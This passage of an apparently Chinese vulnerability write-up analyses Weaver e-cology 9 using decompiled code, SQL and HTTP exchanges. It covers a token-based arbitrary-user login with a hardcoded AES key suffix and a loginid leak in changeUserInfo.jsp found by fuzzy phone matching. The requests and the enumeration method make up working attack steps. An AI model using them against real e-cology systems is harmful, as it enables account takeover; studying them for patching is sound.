class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPropValue</span><span class="params">(String var0, String var1)</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">var2</span> <span class="operator">=</span> loadTemplateProp(var0);</span><br><span class="line">    <span class="keyword">return</span> var2 != <span class="literal">null</span> &amp;&amp; var2.getProperty(var1) != <span class="literal">null</span> ? var2.getProperty(var1).trim() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就变成如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginTokenFromThird2 = AESCoder.encrypt(receiver+timestamp, syscode+<span class="string">&quot;u6skkR&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>继续看<code>AESCoder.encrypt</code>方法，一种基于AES算法的加密方法。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519171839628.png"></p>
<p>那么当<code>loginTokenFromThird</code>参数值等于<code>loginTokenFromThird2</code>的值即<code>AESCoder.encrypt(receiver+timestamp, syscode+&quot;u6skkR&quot;)</code>时，则继续往下进入到else分支。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519175427532.png"></p>
<p>首先是根据<code>syscode</code>参数值进行的一句SQL查询，根据<code>syscode</code>的值从<code>ofs_sendinfo</code>表中查询<code>hrmtransrule</code>的值。如果从表中查询到的<code>hrmtransrule</code>的值为空，则赋值字符串<code>&quot;1&quot;</code>为<code>hrmtransrule</code>参数的值。接着根据<code>hrmtransrule</code>参数值的不同，对<code>rule</code>参数赋不同的值，当然如果<code>hrmtransrule</code>参数值不等于<code>&quot;0&quot;</code>&#x2F;<code>&quot;1&quot;</code>&#x2F;<code>&quot;2&quot;</code>&#x2F;<code>&quot;3&quot;</code>&#x2F;<code>&quot;4&quot;</code>其中一个，它就默认等于<code>&quot;loginid&quot;</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">rs.executeQuery(<span class="string">&quot;select hrmtransrule from ofs_sendinfo where syscode = ?&quot;</span>,syscode);</span><br><span class="line">rs.next();</span><br><span class="line"><span class="type">String</span> <span class="variable">hrmtransrule</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;hrmtransrule&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(StringUtils.isBlank(hrmtransrule))&#123;</span><br><span class="line">    hrmtransrule = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">log.info(<span class="string">&quot;hrmtransrule:&quot;</span>+hrmtransrule);</span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="variable">user_new</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">rule</span> <span class="operator">=</span> <span class="string">&quot;loginid&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;0&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;loginid&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;workcode&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;certificatenum&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;4&quot;</span>.equals(hrmtransrule))&#123;</span><br><span class="line">    rule = <span class="string">&quot;email&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不妨先看看<code>ofs_sendinfo</code>表中的字段以及对应的值，查询结果如下，表中默认只存在一条数据，而且<code>hrmtransrule</code>字段的值为<code>NULL</code>。意味着在默认情况下，无论<code>syscode</code>参数值是什么，都不影响查询出来的<code>hrmtransrule</code>是一个空值，这将导致代码中的<code>hrmtransrule</code>变量值为<code>&quot;1&quot;</code>，然后<code>rule</code>就为<code>&quot;loginid&quot;</code>。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ofs_sendinfo;</span><br><span class="line"></span><br><span class="line">id	syscode	serverurl	classimpl	isvalid	sysdesc	hrmtransrule	send_type_setting</span><br><span class="line"><span class="number">1</span>	IM	weaver.ofs.interfaces.SendRequestStatusDataImplForIM	<span class="number">1</span>	<span class="keyword">For</span> IM	<span class="keyword">NULL</span>	<span class="keyword">NULL</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519224717665.png"></p>
<p>之后，根据<code>rule</code>参数值等于<code>&quot;loginid&quot;</code>，又进行了一次SQL查询，这次是从<code>HrmResource</code>表中进行查询。此处的<code>?</code>表示一个占位符号，在这里意味着<code>receiver</code>变量的值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from HrmResource where &quot;</span>+rule+<span class="string">&quot; = ? and status &lt; 4 &quot;</span>;</span><br><span class="line">log.info(<span class="string">&quot;sql：&quot;</span>+sql);</span><br><span class="line">rs.executeQuery(sql,receiver);</span><br></pre></td></tr></table></figure>

<p>如果查询成功，就从查询结果中取<code>id</code>字段的值，并赋值给变量<code>userId</code>。接着就根据<code>userId</code>去创建对应用户的Session，最后判断<code>result</code>中的<code>status</code>是否为<code>&quot;1&quot;</code>，如果不是则跳转至登录页面，如果是就会跳转至<code>gopage</code>参数对应的路径，若<code>gopage</code>参数的值为<code>/wui/index.html</code>，则会跳转至后台，完成用户登录。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(rs.next())&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">    Map&lt;String, Object&gt; result = (Map&lt;String, Object&gt;)SessionUtil.createSession(userId + <span class="string">&quot;&quot;</span>, request, response);</span><br><span class="line">    log.info(<span class="string">&quot;登陆结果result:&quot;</span>+result);</span><br><span class="line"></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) request.getSession(<span class="literal">true</span>).getAttribute(<span class="string">&quot;weaver_user@bean&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;登陆结果user:&quot;</span>+ JSON.toJSONString(user));</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">status</span> <span class="operator">=</span> (String)result.get(<span class="string">&quot;status&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;=======================登陆认证结束=================================&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(status))&#123;</span><br><span class="line">        <span class="comment">//response.sendRedirect(gopage);</span></span><br><span class="line">        <span class="comment">//return;</span></span><br><span class="line">        toURL = gopage;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        toURL = <span class="string">&quot;/login/Login.jsp&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个过程中，关键就在于<code>receiver</code>参数的值。不过的是，默认情况下<code>HrmResource</code>是一张空表，如下是其各个字段。这也意味着该漏洞在<code>HrmResource</code>表为空的情况下是不可利用的。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> HrmResource;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id	loginid	password	lastname	sex	birthday	nationality	systemlanguage	maritalstatus	telephone	mobile	mobilecall	email	locationid	workroom	homeaddress	resourcetype	startdate	enddate	jobtitle	jobactivitydesc	joblevel	seclevel	departmentid	subcompanyid1	costcenterid	managerid	assistantid	bankid1	accountid1	resourceimageid	createrid	createdate	lastmodid	lastmoddate	lastlogindate	datefield1	datefield2	datefield3	datefield4	datefield5	numberfield1	numberfield2	numberfield3	numberfield4	numberfield5	textfield1	textfield2	textfield3	textfield4	textfield5	tinyintfield1	tinyintfield2	tinyintfield3	tinyintfield4	tinyintfield5	certificatenum	nativeplace	educationlevel	bememberdate	bepartydate	workcode	regresidentplace	healthinfo	residentplace	policy	degree	height	usekind	jobcall	accumfundaccount	birthplace	folk	residentphone	residentpostcode	extphone	managerstr	status	fax	islabouunion	weight	tempresidentnumber	probationenddate	countryid	passwdchgdate	needusb	serial	account	lloginid	needdynapass	dsporder	passwordstate	accounttype	belongto	dactylogram	assistantdactylogram	passwordlock	sumpasswordwrong	oldpassword1	oldpassword2	msgStyle	messagerurl	pinyinlastname	tokenkey	userUsbType	outkey	adsjgs	adgs	adbm	mobileshowtype	usbstate	totalSpace	occupySpace	ecology_pinyin_search	isADAccount	accountname	notallot	beforefrozen	resourcefrom	isnewuser	haschangepwd	created	creater	modified	modifier	passwordlocktime	mobilecaflag	salt	companystartdate	workstartdate	secondaryPwd	useSecondaryPwd	classification	uuid	passwordLockReason	companyworkyear	workyear	DISMISSDATE	encKey	crc</span><br></pre></td></tr></table></figure>

<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230519231925736.png"></p>
<p>登入系统后台新建一名人员，再看<code>HrmResource</code>表发生的变化。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-202305201752562374.png"></p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230523110130299.png"></p>
<p>如上图，其中<code>status</code>字段代表的是人员的状态，有试用&#x2F;正式&#x2F;临时三种状态，显然<code>1</code>对应的是正式状态，只要满足这个值小于4即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs.executeQuery(<span class="string">&quot;select * from HrmResource where loginid = ? and status &lt; 4 &quot;</span>, receiver);</span><br></pre></td></tr></table></figure>

<p>那么现在<code>HrmResource</code>表不为空，只要当<code>receiver</code>变量值为<code>&quot;user1&quot;</code>，便能够对应上<code>HrmResource</code>表中的<code>loginid</code>字段的值，最终就能够成功地实现任意用户登录。</p>
<h3 id="信息泄漏分析"><a href="#信息泄漏分析" class="headerlink" title="信息泄漏分析"></a>信息泄漏分析</h3><p>通过如上的任意用户登录漏洞分析，可以明白该漏洞的利用条件是，需要已知一个存在于<code>HrmResource</code>表中的<code>loginid</code>。接下来来看<code>/mobile/plugin/changeUserInfo.jsp</code>文件以做进一步的<code>loginid</code>信息泄漏漏洞分析。</p>
<p>根据补丁代码，快速定位到存在问题的代码。如下，当<code>type</code>等于<code>&quot;getLoginid&quot;</code>时。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;type&quot;</span>));</span><br><span class="line"><span class="type">String</span> <span class="variable">mobile</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;mobile&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;getLoginid&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="type">RecordSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">	<span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select count(LOGINID) count from HRMRESOURCE where mobile like ?&quot;</span>;</span><br><span class="line">	rs.executeQuery(sql,<span class="string">&quot;%&quot;</span>+mobile+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(rs.next())&#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> Util.getIntValue(rs.getString(<span class="string">&quot;count&quot;</span>),<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span>(count == <span class="number">0</span>)&#123;</span><br><span class="line">			result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;-1&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(count &gt;<span class="number">1</span>)&#123;</span><br><span class="line">			result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span>(count == <span class="number">1</span>)&#123;</span><br><span class="line">			result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">			<span class="type">RecordSet</span> <span class="variable">rs1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecordSet</span>();</span><br><span class="line">			<span class="type">String</span> <span class="variable">sql1</span> <span class="operator">=</span> <span class="string">&quot;select LOGINID from HRMRESOURCE where mobile like ?&quot;</span>;</span><br><span class="line">			rs1.executeQuery(sql1,<span class="string">&quot;%&quot;</span>+mobile+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span>(rs1.next())&#123;</span><br><span class="line">				result.put(<span class="string">&quot;loginId&quot;</span>, rs1.getString(<span class="string">&quot;LOGINID&quot;</span>));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查询时使用了<code>%</code>，可以模糊匹配<code>mobile</code>，当查询出的结果条数为0时，返回<code>&#123;&quot;status&quot;:&quot;-1&quot;&#125;</code>。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=getLoginid&amp;mobile=1234</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>WVS</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span><span class="punctuation">: </span>IE=8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaa18FCpyjT4M7qjA1VCy; path=/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>17</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 19 May 2023 01:41:30 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;-1&quot;</span><span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"></span></span><br></pre></td></tr></table></figure>

<p>当大于1时返回<code>&#123;&quot;status&quot;:&quot;0&quot;&#125; </code>，如下。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=getLoginid&amp;mobile=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>WVS</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>private</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span><span class="punctuation">: </span>IE=8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaazz3rlfOPGyh_GFNZly; path=/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 19 May 2023 01:42:50 GMT</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"></span></span><br></pre></td></tr></table></figure>

<p>在这种情况下，是可以利用BurpSuite的Intruder做进一步模糊查询移动电话的。如下第二张图，存在一个包含17的移动电话，以及多个包含18的移动电话。</p>
<p><img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113512246.png"></p>
<img src="/img/post/weaver-ecology9-changeuserinfo-ofslogin/image-20230520113701520.png" alt="image-20230520113701520" style="zoom: 50%;" />

<p>当等于1时返回<code>&#123;&quot;status&quot;:&quot;1&quot;&#125; </code>以及<code>loginId</code>及其值，在这种情况下，我们就可以直接获取一个<code>loginId</code>。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/mobile/plugin/changeUserInfo.jsp?type=getLoginid&amp;mobile=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 19 May 2023 01:43:50 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">X-UA-Compatible</span><span class="punctuation">: </span>IE=8</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>Thu, 01 Dec 1994 16:00:00 GMT</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>ecology_JSessionid=aaxctkRR1WUJ97SAqRRiy; path=/</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;loginId&quot;</span><span class="punctuation">:</span><span class="string">&quot;xsijr&quot;</span><span class="punctuation">,</span><span class="attr">&quot;status&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"></span></span><br></pre></td></tr></table></figure>

<p>但不过，在上面我们登入系统后台新建一名人员，填写人员信息时，移动电话并不是必填项。<code>%</code>模糊匹配虽然好用，但是当表中的数据条目超过1条，并且它们的<code>mobile</code>字段都为空时，它便再无用武之地了。</p>
<p>所以，我们继续往上看代码，当<code>type</code>等于<code>status</code>时。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;weaver.login.LoginRemindService&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;type&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;status&quot;</span>.equalsIgnoreCase(type))&#123;</span><br><span class="line">	<span class="type">LoginRemindService</span> <span class="variable">loginRemind</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LoginRemindService</span>();</span><br><span class="line">	<span class="type">String</span> <span class="variable">loginId</span> <span class="operator">=</span> Util.null2String(fu.getParameter(<span class="string">&quot;loginId&quot;</span>));</span><br><span class="line">	org.json.<span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> loginRemind.getPassChangedReminder(loginId);</span><br><span class="line">	<span class="keyword">new</span> <span class="title class_">weaver</span>.general.BaseBean().writeLog(<span class="string">&quot;resultA:&quot;</span>+json.toString());</span><br><span class="line">	<span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> json.getString(<span class="string">&quot;resultMsg&quot;</span>);</span><br><span class="line">	result.put(<span class="string">&quot;code&quot;</span>,code);</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">&quot;22&quot;</span>.equalsIgnoreCase(code))&#123;</span><br><span class="line">		result.put(<span class="string">&quot;days&quot;</span>,json.getInt(<span class="string">&quot;passwdelse&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">result.put(<span class="string">&quot;status&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>跟进<code>weaver.login.LoginRemindService</code>中的<code>getPassChangedReminder</code>方法，发现如果提供的<code>loginId</code>参数值在<code>HrmResourceManager</code>表中存在，则<code>code</code>的值会等于<code>&quot;21&quot;</code>，否则<code>code</code>等于<code>&quot;-1&quot;</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JSONObject <span class="title function_">getPassChangedReminder</span><span class="params">(String 